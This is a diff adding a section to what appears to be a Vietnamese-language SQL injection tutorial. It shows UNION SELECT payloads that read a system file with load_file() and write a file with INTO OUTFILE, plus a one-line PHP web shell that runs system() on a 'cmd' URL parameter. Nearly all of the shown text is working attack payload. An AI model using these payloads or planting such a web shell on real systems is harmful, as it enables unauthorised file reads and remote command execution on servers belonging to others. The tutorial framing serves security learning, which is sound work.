@@ -72,3 +72,15 @@ Mục lục:
 `' UNION SELECT load_file("C:/Windows/System32/Drivers/etc/hosts"),NULL,3,4,5,6,7,8,9,NULL,NULL,NULL,13,14 #`
 ![Hinh 15.](~/../img/16.png)
 
+## OUTFILE()
+
+`' UNION SELECT NULL,NULL,3,4,5,6,7,8,9,NULL,NULL,NULL,13,14 INTO OUTFILE "C:/Users/MTGR/Desktop/test.php" #`
+![Hinh 16.](~/../img/17.png)
+
+---php
+<pre>
+<?php
+	system($_GET['cmd'])
+?>
+</pre>
+---
